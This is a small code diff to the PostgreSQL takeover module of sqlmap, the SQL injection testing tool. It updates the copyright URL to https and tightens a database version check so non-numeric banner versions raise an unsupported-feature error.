@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)
+Copyright (c) 2006-2021 sqlmap developers (https://sqlmap.org/)
 See the file 'LICENSE' for copying permission
 """
 
@@ -51,7 +51,7 @@ class Takeover(GenericTakeover):
 
         banVer = kb.bannerFp["dbmsVersion"]
 
-        if not banVer:
+        if not banVer or not banVer[0].isdigit():
             errMsg = "unsupported feature on unknown version of PostgreSQL"
             raise SqlmapUnsupportedFeatureException(errMsg)
         elif distutils.version.LooseVersion(banVer) >= distutils.version.LooseVersion("10"):
